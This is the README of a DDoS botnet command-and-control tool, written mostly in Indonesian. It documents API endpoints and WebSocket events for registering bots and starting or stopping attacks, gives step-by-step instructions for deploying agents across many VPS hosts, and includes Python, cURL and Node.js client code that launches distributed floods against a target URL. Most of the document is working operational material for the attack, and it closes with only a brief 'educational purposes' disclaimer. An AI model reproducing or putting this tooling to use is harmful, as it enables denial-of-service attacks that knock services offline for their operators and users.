# 🎯 Aryzz C2 Command & Control System

## Overview

Sistem C2 (Command & Control) yang powerful untuk mengelola botnet DDoS dengan dashboard web yang modern dan API RESTful.

## 🚀 Features

- ✅ **REST API** - Full API untuk kontrol bot
- ✅ **WebSocket** - Real-time communication
- ✅ **Web Dashboard** - Modern UI dengan TailwindCSS
- ✅ **Multi-Bot Management** - Kelola banyak bot sekaligus
- ✅ **Attack Orchestration** - Koordinasi serangan dari banyak bot
- ✅ **Real-time Statistics** - Monitor serangan secara real-time
- ✅ **Task Management** - Queue dan distribusi task ke bot
- ✅ **SQLite Database** - Persistent storage

## 📦 Installation

```bash
# Install dependencies (sudah termasuk di package.json)
npm install

# Dependencies tambahan sudah include:
# - express, socket.io, sqlite3, axios
```

## 🎮 Usage

### 1. Start C2 Server

```bash
# Default (port 8080)
npm run c2-server

# Custom port dan API key
node index.js c2-server --port 9000 --api-key "your-secret-key"

# Atau langsung
node index.js c2-server -p 8080 --host 0.0.0.0
```

Server akan berjalan di:
- 🌐 Dashboard: `http://localhost:8080/dashboard`
- 📡 API: `http://localhost:8080/api`
- 🔌 WebSocket: `ws://localhost:8080`

### 2. Start C2 Agent (Bot)

```bash
# Connect ke C2 server
npm run c2-agent

# Custom C2 URL
node index.js c2-agent --c2-url http://your-c2-server.com:8080

# Dengan custom API key
node index.js c2-agent --c2-url http://server:8080 --api-key "your-key"
```

### 3. Deploy Multiple Bots

Jalankan agent di multiple server/VPS:

```bash
# Server 1
ssh user@vps1.com
cd /path/to/bot
node index.js c2-agent --c2-url http://your-c2:8080

# Server 2
ssh user@vps2.com
cd /path/to/bot
node index.js c2-agent --c2-url http://your-c2:8080

# Server 3
ssh user@vps3.com
cd /path/to/bot
node index.js c2-agent --c2-url http://your-c2:8080
```

## 📡 API Documentation

### Authentication

Semua request memerlukan API key di header:
```
X-API-Key: aryzz-c2-api-key-2024
```

### Endpoints

#### 🤖 Bot Management

**Register Bot**
```bash
POST /api/bot/register
Content-Type: application/json

{
  "hostname": "bot-server-01",
  "ip": "1.2.3.4",
  "os": "Linux 5.15",
  "arch": "x64",
  "cpus": 4,
  "memory": 8192,
  "version": "1.0.0"
}
```

**List All Bots**
```bash
GET /api/bots
X-API-Key: your-api-key
```

**Get Bot Details**
```bash
GET /api/bot/{botId}
X-API-Key: your-api-key
```

**Bot Heartbeat**
```bash
POST /api/bot/{botId}/heartbeat
Content-Type: application/json

{
  "stats": {
    "cpu": 45.2,
    "memory": { "used": 4096, "total": 8192 },
    "activeAttacks": 2
  }
}
```

#### ⚡ Attack Management

**Start Attack**
```bash
POST /api/attack/start
X-API-Key: your-api-key
Content-Type: application/json

{
  "target": "https://target.com",
  "method": "GET",
  "threads": 500,
  "duration": 120,
  "rpc": 10,
  "botIds": []  // Empty = semua bot
}
```

**Stop Attack**
```bash
POST /api/attack/{attackId}/stop
X-API-Key: your-api-key
```

**List Attacks**
```bash
GET /api/attacks?status=running&limit=50
X-API-Key: your-api-key
```

**Get Attack Details**
```bash
GET /api/attack/{attackId}
X-API-Key: your-api-key
```

**Get Attack Stats**
```bash
GET /api/attack/{attackId}/stats
X-API-Key: your-api-key
```

#### 📊 Statistics

**Overview Stats**
```bash
GET /api/stats/overview
X-API-Key: your-api-key

Response:
{
  "success": true,
  "stats": {
    "bots": { "total": 10, "online": 8, "offline": 2 },
    "attacks": { "total": 50, "running": 3, "completed": 47 },
    "requests": { "total": 1500000, "successful": 1450000, "failed": 50000 }
  }
}
```

**Bot Stats**
```bash
GET /api/stats/bots
X-API-Key: your-api-key
```

#### 🎯 Task Management

**Create Task**
```bash
POST /api/task/create
X-API-Key: your-api-key
Content-Type: application/json

{
  "botId": "bot-uuid",
  "type": "attack",
  "command": {
    "action": "start_attack",
    "target": "https://target.com",
    "method": "GET",
    "threads": 100,
    "duration": 60
  }
}
```

**Get Bot Tasks**
```bash
GET /api/bot/{botId}/tasks
```

**Complete Task**
```bash
POST /api/task/{taskId}/complete
Content-Type: application/json

{
  "success": true,
  "stats": {
    "totalRequests": 50000,
    "successfulRequests": 48000,
    "failedRequests": 2000
  }
}
```

## 🔌 WebSocket Events

### Client → Server

**Bot Connection**
```javascript
socket.emit('bot:connect', {
  botId: 'your-bot-id',
  apiKey: 'your-api-key'
});
```

**Bot Stats Update**
```javascript
socket.emit('bot:stats', {
  cpu: 45.2,
  memory: { used: 4096, total: 8192 },
  activeAttacks: 2
});
```

**Attack Progress**
```javascript
socket.emit('attack:progress', {
  attackId: 'attack-uuid',
  progress: {
    totalRequests: 10000,
    successfulRequests: 9500,
    failedRequests: 500
  }
});
```

### Server → Client

**New Task**
```javascript
socket.on('task:new', (task) => {
  console.log('New task:', task);
  // Execute task
});
```

**Stop Task**
```javascript
socket.on('task:stop', (data) => {
  console.log('Stop task:', data.taskId);
  // Stop execution
});
```

**Bot Registered**
```javascript
socket.on('bot:registered', (bot) => {
  console.log('New bot:', bot);
});
```

**Attack Started**
```javascript
socket.on('attack:started', (attack) => {
  console.log('Attack started:', attack);
});
```

## 🌐 Web Dashboard

Akses dashboard di: `http://localhost:8080/dashboard`

### Features:
- 📊 **Real-time Statistics** - Total bots, attacks, requests
- 🤖 **Bot Management** - View all connected bots
- ⚡ **Attack Control** - Start/stop attacks
- 📈 **Live Updates** - WebSocket real-time updates
- 🎮 **Control Panel** - Launch attacks from web UI

### Default Credentials:
- Username: `admin`
- Password: `admin123`

## 🔧 Configuration

Edit `config.json`:

```json
{
  "c2": {
    "enabled": true,
    "server": {
      "port": 8080,
      "host": "0.0.0.0",
      "apiKey": "aryzz-c2-api-key-2024"
    },
    "agent": {
      "c2Url": "http://localhost:8080",
      "reconnectInterval": 5000,
      "heartbeatInterval": 30000
    }
  }
}
```

## 📝 Example Usage

### Python Client Example

```python
import requests
import json

API_URL = "http://localhost:8080/api"
API_KEY = "aryzz-c2-api-key-2024"

headers = {
    "X-API-Key": API_KEY,
    "Content-Type": "application/json"
}

# Start attack
attack_data = {
    "target": "https://target.com",
    "method": "GET",
    "threads": 500,
    "duration": 120,
    "rpc": 10
}

response = requests.post(
    f"{API_URL}/attack/start",
    headers=headers,
    json=attack_data
)

print(response.json())
```

### cURL Example

```bash
# Start attack
curl -X POST http://localhost:8080/api/attack/start \
  -H "X-API-Key: aryzz-c2-api-key-2024" \
  -H "Content-Type: application/json" \
  -d '{
    "target": "https://target.com",
    "method": "GET",
    "threads": 500,
    "duration": 120,
    "rpc": 10
  }'

# List bots
curl http://localhost:8080/api/bots \
  -H "X-API-Key: aryzz-c2-api-key-2024"

# Get stats
curl http://localhost:8080/api/stats/overview \
  -H "X-API-Key: aryzz-c2-api-key-2024"
```

### JavaScript/Node.js Client

```javascript
const axios = require('axios');
const io = require('socket.io-client');

const API_URL = 'http://localhost:8080/api';
const API_KEY = 'aryzz-c2-api-key-2024';

// Start attack via API
async function startAttack() {
  const response = await axios.post(
    `${API_URL}/attack/start`,
    {
      target: 'https://target.com',
      method: 'GET',
      threads: 500,
      duration: 120,
      rpc: 10
    },
    {
      headers: { 'X-API-Key': API_KEY }
    }
  );
  
  console.log('Attack started:', response.data);
}

// Connect WebSocket
const socket = io('http://localhost:8080');

socket.on('connect', () => {
  console.log('Connected to C2');
});

socket.on('attack:started', (attack) => {
  console.log('New attack:', attack);
});

startAttack();
```

## 🔒 Security

1. **Change API Key** - Ganti default API key di production
2. **Use HTTPS** - Deploy dengan SSL/TLS
3. **Firewall** - Restrict akses ke C2 server
4. **Authentication** - Implement proper auth untuk dashboard
5. **Rate Limiting** - Add rate limiting untuk API

## 🚀 Deployment

### Deploy C2 Server (VPS)

```bash
# 1. Setup server
ssh root@your-vps.com
apt update && apt install -y nodejs npm

# 2. Clone & install
git clone https://github.com/AryzXploit/BOT-TELE-DOS.git
cd BOT-TELE-DOS
npm install

# 3. Configure
nano config.json
# Edit c2 settings

# 4. Run with PM2
npm install -g pm2
pm2 start index.js --name c2-server -- c2-server -p 8080
pm2 save
pm2 startup

# 5. Setup firewall
ufw allow 8080/tcp
ufw enable
```

### Deploy Bot Agents (Multiple VPS)

```bash
# On each bot VPS
git clone https://github.com/AryzXploit/BOT-TELE-DOS.git
cd BOT-TELE-DOS
npm install

# Run agent
pm2 start index.js --name c2-agent -- c2-agent --c2-url http://your-c2-server:8080
pm2 save
```

## 📊 Monitoring

```bash
# View C2 server logs
pm2 logs c2-server

# View agent logs
pm2 logs c2-agent

# Monitor resources
pm2 monit

# View dashboard
http://your-c2-server:8080/dashboard
```

## 🎯 Advanced Usage

### Load Balancing Multiple C2 Servers

```nginx
upstream c2_backend {
    server c2-server-1:8080;
    server c2-server-2:8080;
    server c2-server-3:8080;
}

server {
    listen 80;
    server_name c2.yourdomain.com;
    
    location / {
        proxy_pass http://c2_backend;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection "upgrade";
    }
}
```

### Distributed Attack

```javascript
// Launch attack across all bots
const response = await axios.post(`${API_URL}/attack/start`, {
  target: 'https://target.com',
  method: 'GET',
  threads: 1000,  // Total threads
  duration: 300,
  rpc: 10,
  botIds: []  // Empty = distribute to all bots
});

// Attack will be distributed:
// 10 bots = 100 threads per bot
// 5 bots = 200 threads per bot
```

## 🐛 Troubleshooting

**Bot tidak connect:**
- Check C2 URL benar
- Check API key match
- Check firewall/network

**Attack tidak jalan:**
- Check bot status online
- Check task queue
- View logs: `pm2 logs`

**Dashboard tidak load:**
- Check server running
- Check port tidak blocked
- Clear browser cache

## 📞 Support

- GitHub: https://github.com/AryzXploit
- Telegram: @AryzzXploit

## ⚠️ Disclaimer

Tool ini untuk testing dan educational purposes only. Gunakan dengan bijak dan legal.

---

**Developed by Aryzz-Dev** 🔥
